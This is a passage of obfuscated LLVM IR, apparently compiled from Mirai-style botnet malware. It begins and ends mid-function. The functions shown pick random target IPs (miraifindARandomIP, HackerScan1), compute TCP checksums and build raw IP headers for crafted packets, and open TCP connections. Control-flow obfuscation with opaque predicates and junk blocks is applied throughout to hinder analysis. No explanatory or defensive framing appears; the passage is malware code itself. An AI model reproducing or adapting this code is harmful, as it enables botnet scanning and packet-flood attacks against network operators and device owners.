  %400 = zext i8 %399 to i32
  %401 = shl i32 %400, 24
  %402 = load i8, i8* %11, align 1
  %403 = zext i8 %402 to i32
  %404 = shl i32 %403, 16
  %405 = or i32 %401, %404
  %406 = load i8, i8* %12, align 1
  %407 = zext i8 %406 to i32
  %408 = shl i32 %407, 8
  %409 = or i32 %405, %408
  %410 = load i8, i8* %13, align 1
  %411 = zext i8 %410 to i32
  %412 = shl i32 %411, 0
  %413 = or i32 %409, %412
  %414 = call i32 @htonl(i32 %413) #10
  ret i32 %414

originalBBalteredBB:                              ; preds = %originalBB, %0
  %415 = alloca i32, align 4
  %416 = alloca i8, align 1
  %417 = alloca i8, align 1
  %418 = alloca i8, align 1
  %419 = alloca i8, align 1
  %420 = alloca [16 x i8], align 16
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %421 = call i32 @rand_cmwc()
  store i32 %421, i32* %9, align 4
  %422 = load i32, i32* %9, align 4
  %_ = shl i32 %422, 255
  %423 = and i32 %422, 255
  %424 = trunc i32 %423 to i8
  store i8 %424, i8* %10, align 1
  %425 = load i32, i32* %9, align 4
  %_2 = shl i32 %425, 8
  %426 = lshr i32 %425, 8
  %_3 = sub i32 0, %426
  %gen = add i32 %_3, 255
  %_4 = sub i32 0, %426
  %gen5 = add i32 %_4, 255
  %_6 = shl i32 %426, 255
  %_7 = sub i32 %426, 255
  %gen8 = mul i32 %_7, 255
  %_9 = sub i32 %426, 255
  %gen10 = mul i32 %_9, 255
  %_11 = sub i32 %426, 255
  %gen12 = mul i32 %_11, 255
  %_13 = sub i32 %426, 255
  %gen14 = mul i32 %_13, 255
  %_15 = shl i32 %426, 255
  %_16 = sub i32 %426, 255
  %gen17 = mul i32 %_16, 255
  %427 = and i32 %426, 255
  %428 = trunc i32 %427 to i8
  store i8 %428, i8* %11, align 1
  %429 = load i32, i32* %9, align 4
  %_18 = shl i32 %429, 16
  %_19 = sub i32 0, %429
  %gen20 = add i32 %_19, 16
  %_21 = shl i32 %429, 16
  %_22 = sub i32 %429, 16
  %gen23 = mul i32 %_22, 16
  %_24 = sub i32 %429, 16
  %gen25 = mul i32 %_24, 16
  %430 = lshr i32 %429, 16
  %_26 = sub i32 0, %430
  %gen27 = add i32 %_26, 255
  %_28 = sub i32 0, %430
  %gen29 = add i32 %_28, 255
  %_30 = shl i32 %430, 255
  %_31 = sub i32 0, %430
  %gen32 = add i32 %_31, 255
  %_33 = shl i32 %430, 255
  %_34 = sub i32 0, %430
  %gen35 = add i32 %_34, 255
  %431 = and i32 %430, 255
  %432 = trunc i32 %431 to i8
  store i8 %432, i8* %12, align 1
  %433 = load i32, i32* %9, align 4
  %_36 = shl i32 %433, 24
  %_37 = shl i32 %433, 24
  %434 = lshr i32 %433, 24
  %_38 = sub i32 0, %434
  %gen39 = add i32 %_38, 255
  %_40 = sub i32 0, %434
  %gen41 = add i32 %_40, 255
  %_42 = sub i32 0, %434
  %gen43 = add i32 %_42, 255
  %_44 = sub i32 %434, 255
  %gen45 = mul i32 %_44, 255
  %435 = and i32 %434, 255
  %436 = trunc i32 %435 to i8
  store i8 %436, i8* %13, align 1
  br label %originalBB1

originalBB49alteredBB:                            ; preds = %originalBB49, %64
  %437 = load i8, i8* %10, align 1
  %438 = zext i8 %437 to i32
  %439 = icmp eq i32 %438, 3
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %104
  %440 = load i8, i8* %11, align 1
  %441 = zext i8 %440 to i32
  %442 = icmp eq i32 %441, 168
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %128
  %443 = load i8, i8* %11, align 1
  %444 = zext i8 %443 to i32
  %445 = icmp sge i32 %444, 16
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %148
  %446 = load i8, i8* %11, align 1
  %447 = zext i8 %446 to i32
  %448 = icmp slt i32 %447, 32
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %168
  %449 = load i8, i8* %10, align 1
  %450 = zext i8 %449 to i32
  %451 = icmp eq i32 %450, 100
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %188
  %452 = load i8, i8* %11, align 1
  %453 = zext i8 %452 to i32
  %454 = icmp sge i32 %453, 64
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %208
  %455 = load i8, i8* %11, align 1
  %456 = zext i8 %455 to i32
  %457 = icmp slt i32 %456, 127
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %228
  %458 = load i8, i8* %10, align 1
  %459 = zext i8 %458 to i32
  %460 = icmp eq i32 %459, 169
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %256
  %461 = load i8, i8* %11, align 1
  %462 = zext i8 %461 to i32
  %463 = icmp sge i32 %462, 18
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %276
  %464 = load i8, i8* %11, align 1
  %465 = zext i8 %464 to i32
  %466 = icmp slt i32 %465, 20
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %328
  %467 = load i8, i8* %10, align 1
  %468 = zext i8 %467 to i32
  %469 = icmp eq i32 %468, 29
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %356
  %470 = load i8, i8* %10, align 1
  %471 = zext i8 %470 to i32
  %472 = icmp eq i32 %471, 55
  br label %originalBB93
}

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

; Function Attrs: noinline nounwind uwtable
define i32 @miraifindARandomIP() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @mirairange, align 4
  %3 = icmp slt i32 %2, 1
  br i1 %3, label %7, label %4

; <label>:4:                                      ; preds = %0
  %5 = load i32, i32* @mirairange, align 4
  %6 = icmp sgt i32 %5, 2
  br i1 %6, label %7, label %9

; <label>:7:                                      ; preds = %4, %0
  %8 = call i32 @MiraiIPRanges()
  store i32 %8, i32* %1, align 4
  br label %37

; <label>:9:                                      ; preds = %4
  %10 = load i32, i32* @x.75
  %11 = load i32, i32* @y.76
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i32, i32* @mirairange, align 4
  %19 = icmp eq i32 %18, 1
  %20 = load i32, i32* @x.75
  %21 = load i32, i32* @y.76
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %28, label %30

; <label>:28:                                     ; preds = %originalBBpart2
  %29 = call i32 @getRandomPublicIP()
  store i32 %29, i32* %1, align 4
  br label %37

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i32, i32* @mirairange, align 4
  %32 = icmp eq i32 %31, 2
  br i1 %32, label %33, label %35

; <label>:33:                                     ; preds = %30
  %34 = call i32 @HackerScan1()
  store i32 %34, i32* %1, align 4
  br label %37

; <label>:35:                                     ; preds = %30
  %36 = call i32 @MiraiIPRanges()
  store i32 %36, i32* %1, align 4
  br label %37

; <label>:37:                                     ; preds = %35, %33, %28, %7
  %38 = load i32, i32* %1, align 4
  ret i32 %38

originalBBalteredBB:                              ; preds = %originalBB, %9
  %39 = load i32, i32* @mirairange, align 4
  %40 = icmp eq i32 %39, 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %originalBBpart25, %2
  %7 = load i32, i32* @x.79
  %8 = load i32, i32* @y.80
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %4, align 4
  %16 = icmp sgt i32 %15, 1
  %17 = load i32, i32* @x.79
  %18 = load i32, i32* @y.80
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %16, label %25, label %50

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i32, i32* @x.79
  %27 = load i32, i32* @y.80
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i16*, i16** %3, align 8
  %35 = getelementptr inbounds i16, i16* %34, i32 1
  store i16* %35, i16** %3, align 8
  %36 = load i16, i16* %34, align 2
  %37 = zext i16 %36 to i64
  %38 = load i64, i64* %5, align 8
  %39 = add i64 %38, %37
  store i64 %39, i64* %5, align 8
  %40 = load i32, i32* %4, align 4
  %41 = sub nsw i32 %40, 2
  store i32 %41, i32* %4, align 4
  %42 = load i32, i32* @x.79
  %43 = load i32, i32* @y.80
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart25, label %originalBB1alteredBB

originalBBpart25:                                 ; preds = %originalBB1
  br label %6

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i32, i32* %4, align 4
  %52 = icmp sgt i32 %51, 0
  br i1 %52, label %53, label %60

; <label>:53:                                     ; preds = %50
  %54 = load i16*, i16** %3, align 8
  %55 = bitcast i16* %54 to i8*
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i64
  %58 = load i64, i64* %5, align 8
  %59 = add i64 %58, %57
  store i64 %59, i64* %5, align 8
  br label %60

; <label>:60:                                     ; preds = %53, %50
  br label %61

; <label>:61:                                     ; preds = %originalBBpart228, %60
  %62 = load i64, i64* %5, align 8
  %63 = lshr i64 %62, 16
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %65, label %87

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* @x.79
  %67 = load i32, i32* @y.80
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %65
  %74 = load i64, i64* %5, align 8
  %75 = and i64 %74, 65535
  %76 = load i64, i64* %5, align 8
  %77 = lshr i64 %76, 16
  %78 = add i64 %75, %77
  store i64 %78, i64* %5, align 8
  %79 = load i32, i32* @x.79
  %80 = load i32, i32* @y.80
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart228, label %originalBB7alteredBB

originalBBpart228:                                ; preds = %originalBB7
  br label %61

; <label>:87:                                     ; preds = %61
  %88 = load i64, i64* %5, align 8
  %89 = xor i64 %88, -1
  %90 = trunc i64 %89 to i16
  ret i16 %90

originalBBalteredBB:                              ; preds = %originalBB, %6
  %91 = load i32, i32* %4, align 4
  %92 = icmp sgt i32 %91, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %93 = load i16*, i16** %3, align 8
  %94 = getelementptr inbounds i16, i16* %93, i32 1
  store i16* %94, i16** %3, align 8
  %95 = load i16, i16* %93, align 2
  %96 = zext i16 %95 to i64
  %97 = load i64, i64* %5, align 8
  %_ = sub i64 0, %97
  %gen = add i64 %_, %96
  %98 = add i64 %97, %96
  store i64 %98, i64* %5, align 8
  %99 = load i32, i32* %4, align 4
  %_2 = sub i32 0, %99
  %gen3 = add i32 %_2, 2
  %100 = sub nsw i32 %99, 2
  store i32 %100, i32* %4, align 4
  br label %originalBB1

originalBB7alteredBB:                             ; preds = %originalBB7, %65
  %101 = load i64, i64* %5, align 8
  %_8 = sub i64 %101, 65535
  %gen9 = mul i64 %_8, 65535
  %_10 = sub i64 0, %101
  %gen11 = add i64 %_10, 65535
  %_12 = sub i64 %101, 65535
  %gen13 = mul i64 %_12, 65535
  %_14 = shl i64 %101, 65535
  %102 = and i64 %101, 65535
  %103 = load i64, i64* %5, align 8
  %_15 = shl i64 %103, 16
  %_16 = sub i64 %103, 16
  %gen17 = mul i64 %_16, 16
  %_18 = sub i64 0, %103
  %gen19 = add i64 %_18, 16
  %104 = lshr i64 %103, 16
  %_20 = sub i64 0, %102
  %gen21 = add i64 %_20, %104
  %_22 = shl i64 %102, %104
  %_23 = sub i64 %102, %104
  %gen24 = mul i64 %_23, %104
  %_25 = shl i64 %102, %104
  %_26 = shl i64 %102, %104
  %105 = add i64 %102, %104
  store i64 %105, i64* %5, align 8
  br label %originalBB7
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = load i32, i32* @x.83
  %7 = load i32, i32* @y.84
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca %struct.iphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %14, align 8
  store i32 %1, i32* %15, align 4
  store i32 %2, i32* %16, align 4
  store i8 %3, i8* %17, align 1
  store i32 %4, i32* %18, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %20 = bitcast %struct.iphdr* %19 to i8*
  %21 = load i8, i8* %20, align 4
  %22 = and i8 %21, -16
  %23 = or i8 %22, 5
  store i8 %23, i8* %20, align 4
  %24 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %25 = bitcast %struct.iphdr* %24 to i8*
  %26 = load i8, i8* %25, align 4
  %27 = and i8 %26, 15
  %28 = or i8 %27, 64
  store i8 %28, i8* %25, align 4
  %29 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %30 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %29, i32 0, i32 1
  store i8 0, i8* %30, align 1
  %31 = load i32, i32* %18, align 4
  %32 = sext i32 %31 to i64
  %33 = add i64 20, %32
  %34 = trunc i64 %33 to i16
  %35 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 2
  store i16 %34, i16* %36, align 2
  %37 = call i32 @rand_cmwc()
  %38 = trunc i32 %37 to i16
  %39 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 3
  store i16 %38, i16* %40, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 4
  store i16 0, i16* %42, align 2
  %43 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 5
  store i8 -1, i8* %44, align 4
  %45 = load i8, i8* %17, align 1
  %46 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 6
  store i8 %45, i8* %47, align 1
  %48 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 7
  store i16 0, i16* %49, align 2
  %50 = load i32, i32* %16, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 8
  store i32 %50, i32* %52, align 4
  %53 = load i32, i32* %15, align 4
  %54 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 9
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* @x.83
  %57 = load i32, i32* @y.84
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %64 = alloca %struct.iphdr*, align 8
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  %67 = alloca i8, align 1
  %68 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %64, align 8
  store i32 %1, i32* %65, align 4
  store i32 %2, i32* %66, align 4
  store i8 %3, i8* %67, align 1
  store i32 %4, i32* %68, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %70 = bitcast %struct.iphdr* %69 to i8*
  %71 = load i8, i8* %70, align 4
  %_ = sub i8 0, %71
  %gen = add i8 %_, -16
  %_1 = shl i8 %71, -16
  %_2 = shl i8 %71, -16
  %_3 = shl i8 %71, -16
  %72 = and i8 %71, -16
  %_4 = shl i8 %72, 5
  %_5 = shl i8 %72, 5
  %_6 = sub i8 %72, 5
  %gen7 = mul i8 %_6, 5
  %_8 = sub i8 0, %72
  %gen9 = add i8 %_8, 5
  %_10 = sub i8 %72, 5
  %gen11 = mul i8 %_10, 5
  %_12 = shl i8 %72, 5
  %73 = or i8 %72, 5
  store i8 %73, i8* %70, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = load i8, i8* %75, align 4
  %_13 = sub i8 0, %76
  %gen14 = add i8 %_13, 15
  %_15 = sub i8 0, %76
  %gen16 = add i8 %_15, 15
  %_17 = sub i8 0, %76
  %gen18 = add i8 %_17, 15
  %_19 = sub i8 0, %76
  %gen20 = add i8 %_19, 15
  %_21 = sub i8 0, %76
  %gen22 = add i8 %_21, 15
  %_23 = sub i8 0, %76
  %gen24 = add i8 %_23, 15
  %77 = and i8 %76, 15
  %_25 = sub i8 0, %77
  %gen26 = add i8 %_25, 64
  %_27 = shl i8 %77, 64
  %78 = or i8 %77, 64
  store i8 %78, i8* %75, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 1
  store i8 0, i8* %80, align 1
  %81 = load i32, i32* %68, align 4
  %82 = sext i32 %81 to i64
  %_28 = sub i64 20, %82
  %gen29 = mul i64 %_28, %82
  %_30 = sub i64 20, %82
  %gen31 = mul i64 %_30, %82
  %_32 = sub i64 0, 20
  %gen33 = add i64 %_32, %82
  %_34 = shl i64 20, %82
  %83 = add i64 20, %82
  %84 = trunc i64 %83 to i16
  %85 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 2
  store i16 %84, i16* %86, align 2
  %87 = call i32 @rand_cmwc()
  %88 = trunc i32 %87 to i16
  %89 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 3
  store i16 %88, i16* %90, align 4
  %91 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %92 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %91, i32 0, i32 4
  store i16 0, i16* %92, align 2
  %93 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 5
  store i8 -1, i8* %94, align 4
  %95 = load i8, i8* %67, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 6
  store i8 %95, i8* %97, align 1
  %98 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i32 0, i32 7
  store i16 0, i16* %99, align 2
  %100 = load i32, i32* %66, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 8
  store i32 %100, i32* %102, align 4
  %103 = load i32, i32* %65, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i32 0, i32 9
  store i32 %103, i32* %105, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %26

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* @x.85
  %9 = load i32, i32* @y.86
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %3, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* %2, align 4
  %18 = load i32, i32* @x.85
  %19 = load i32, i32* @y.86
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %6
  %27 = load i32, i32* %2, align 4
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %7
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @close(i32 %28)
  store i32 0, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @echo_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %5, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.860, i32 0, i32 0)) #5
  call void @exit(i32 1) #11
  unreachable

; <label>:13:                                     ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %5, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %20 = bitcast %struct.in_addr* %19 to i8*
  %21 = load %struct.hostent*, %struct.hostent** %5, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 3
  %23 = load i32, i32* %22, align 4
  %24 = sext i32 %23 to i64
  call void @bcopy(i8* %18, i8* %20, i64 %24) #5
  %25 = load i16, i16* %4, align 2
  %26 = call zeroext i16 @htons(i16 zeroext %25) #10
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %8, align 4
  %31 = bitcast i32* %7 to i8*
  %32 = call i32 @setsockopt(i32 %30, i32 6, i32 1, i8* %31, i32 4) #5
  %33 = load i32, i32* %8, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %13
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.861, i32 0, i32 0))
  call void @exit(i32 1) #11
  unreachable

; <label>:36:                                     ; preds = %13
  %37 = load i32, i32* %8, align 4
